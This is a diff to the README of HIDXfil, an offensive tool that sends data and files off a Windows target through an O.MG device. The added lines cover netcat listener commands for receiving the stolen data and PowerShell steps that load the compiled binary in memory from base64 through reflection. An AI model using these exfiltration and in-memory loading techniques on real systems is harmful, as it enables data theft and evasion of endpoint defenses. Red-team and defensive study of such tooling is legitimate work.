@@ -4,6 +4,8 @@
 ![hidxfil](https://github.com/user-attachments/assets/5f6eb9c3-48fa-41e8-b2ce-23d3aaf0ea04)
 
 ## Usage
+I'm not planning on releasing binaries for HIDXfil, so you will have to compile yourself :)
+
 The Usage of the provided project is pretty much self explanatory.
 After successfully compiling the project, the binary can simply be used on a Windows Target system. 
 ```
@@ -31,7 +33,29 @@ Example: HIDXfil.exe /message "Hello World" /vid D3C0 /pid D34D /chunksize 8
 A chunksize of 8 was set to ensure the best results. Changing this value may result in missing data and corrupted files.
 Generally, any TCP Listener can be used to retreive the data sent by the O.MG device. 
 
-Netcat may be your first choice: `nc -lvnp <port> / nc -lvnp <port> > example.file`
+Exfiltrating files is not as reliable as pure "text-based" input. Depending on size and filetype it may needs multiple tries and different chunk sizes.
+
+Netcat may be your first choice: `nc -lvnp <port>` / `nc -lvnp <port> > example.file`
+
+## Running HIDXfil Through PowerShell
+While there are PowerShell scripts provoding exfiltration via HIDX StealthLink, **HIDXfil.exe** may introduce more functionalities. If you do want to run it through PowerShell though, considere the following steps:
+
+If you want to run **HIDXfil** in-memory through a PowerShell wrapper, first compile **HIDXfil** and encode the resulting binary into base64:
+
+`$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<Path to .exe>"))`
+
+**HIDXfil** can then be loaded in a PowerShell script with the following:
+
+`$AssemblyLoad = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64))`
+
+Afterwards, identify the entry point:
+
+`$EntryPoint = $AssemblyLoad.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')`
+
+Executing the loaded assembly then can be achieved like this (If you do need to define multiple arguments, seperate them via `,`):
+
+`$EntryPoint.Invoke($null, (, [string[]] ('<Argument(s)>')))`
+
 
 ## Disclaimer
 By using the provided code, you agree to the following terms:
